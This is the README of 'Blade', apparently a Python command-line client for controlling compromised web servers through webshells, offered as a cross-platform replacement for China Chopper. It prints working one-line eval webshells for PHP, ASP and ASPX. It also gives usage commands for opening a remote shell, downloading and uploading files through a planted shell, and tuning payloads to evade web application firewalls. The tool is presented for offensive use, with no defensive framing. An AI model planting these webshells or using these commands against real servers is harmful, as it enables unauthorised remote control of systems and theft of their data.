## Blade
Blade is a webshell connection tool based on console, currently under development and aims to be a choice of replacement of Chooper (中国菜刀). Chooper is a very cool webshell client with widly typies of server side scripts supported, but Chooper can only work on Windows opreation system, so this is the motivation of create another "Chooper" supporting Windows, Linux & Mac OS X. Blade is based on Python, so it allows users to modify the webshell connection payloads so that Blade can bypass some specified WAF which Chooper can not.
## Major functions
Manage a web server with only one-line code on it, just like: <?php @eval($_REQUEST["cmd"]); ?>

PHP, ASP, ASPX & JSP supported.

Terminal Console provided.

File management & Dadabase management.
## Features
Cross-plaform supported (Python needed)

Customizable WAF bypass payloads

Compatible with Chooper's server side scripts
## Server side scripts examples
PHP:
<?php @eval($_REQUEST["cmd"]); ?>

ASP:
<%eval request("cmd")%>

ASPX:
<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>
## Usage
Get a shell:

 python blade.py -u http://localhost/shell.php -s php -p cmd --shell

Get a shell with longer timeout (i.e. for windows):

python blade.py -u http://localhost/shell.aspx -s asp -p cmd --shell -t 60

Download a file:

python blade.py -u http://localhost/shell.php -s php -p cmd --pull remote_path local_path

Upload a file:

python blade.py -u http://localhost/shell.php -s php -p cmd --push local_path remote_path
## Current issues
Server side scripts supporting is not completed, currently support PHP, ASP and ASPX
ASPX file upload/download is still under development

Database management function is not completed, so can not connect databases

## TODO
Implment JSP

Fix file handling

## Future developent
Beacuse I am busy sometimes, the progress of development may be a bit slow. If anyone intrest this project, welcome fork!
